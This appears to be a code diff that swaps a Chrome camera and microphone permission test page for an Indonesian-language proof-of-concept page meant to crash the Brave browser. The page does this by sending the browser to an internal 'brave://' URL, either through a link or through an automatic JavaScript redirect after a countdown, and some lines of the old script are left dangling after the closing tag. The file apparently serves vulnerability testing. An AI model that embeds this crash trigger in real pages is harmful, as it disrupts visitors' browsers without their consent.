@@ -1,39 +1,78 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>Chrome Permission Test</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brave Browser Crash PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 30px;
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff5722;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #e64a19;
+        }
+        .method {
+            margin: 30px 0;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
 
-<button onclick="requestCamera()">Request Camera</button>
-<button onclick="requestMicrophone()">Request Microphone</button>
-<button onclick="requestBoth()">Request Camera + Microphone</button>
+    <h1>Brave Crash Test PoC</h1>
+    <p>Gunakan file ini untuk menguji apakah celah keamanan ini bisa dipicu dari halaman web.</p>
 
-<pre id="result"></pre>
+    <!-- Metode 1: Interaksi Pengguna (Klik Link) -->
+    <div class="method">
+        <h3>Metode 1: Klik Tautan Manual</h3>
+        <p>Coba klik tombol di bawah ini. Jika browser langsung force close, berarti skema internal bisa dipicu via interaksi klik.</p>
+        <a href="brave://google.com">
+            <button>Klik untuk Memicu Crash</button>
+        </a>
+    </div>
 
-<script>
-const result = document.getElementById("result");
+    <!-- Metode 2: Otomatis via JavaScript -->
+    <div class="method">
+        <h3>Metode 2: Otomatis via Pengalihan JS (Tanpa Klik)</h3>
+        <p>Tombol di bawah ini akan mencoba mengalihkan halaman secara otomatis menggunakan JavaScript setelah jeda 3 detik.</p>
+        <button onclick="startAutoRedirect()">Jalankan Auto-Redirect (3 Detik)</button>
+        <p id="status" style="color: blue; font-weight: bold;"></p>
+    </div>
 
-async function request(constraints) {
-  result.textContent = "Requesting permission...";
+    <script>
+        function startAutoRedirect() {
+            let countdown = 3;
+            const statusText = document.getElementById('status');
+            
+            const interval = setInterval(() => {
+                statusText.innerText = `Mengalihkan dalam ${countdown}...`;
+                countdown--;
+                
+                if (countdown < 0) {
+                    clearInterval(interval);
+                    statusText.innerText = "Mengeksekusi pengalihan...";
+                    // Memicu crash otomatis tanpa interaksi klik
+                    window.location.href = "brave://google.com";
+                }
+            }, 1000);
+        }
+    </script>
 
-  try {
-    const stream =
-      await navigator.mediaDevices.getUserMedia(constraints);
-
-    // The PoC does not continuously record.
-    // Immediately release the granted media devices.
-    stream.getTracks().forEach(track => track.stop());
-
-    result.textContent = "Permission granted";
-  } catch (e) {
-    result.textContent = e.name;
-  }
-}
-
-function requestCamera() {
-  request({ video: true });
-}
-
-function requestMicrophone() {
-  request({ audio: true });
+</body>
+</html>
 }
 
 function requestBoth() {
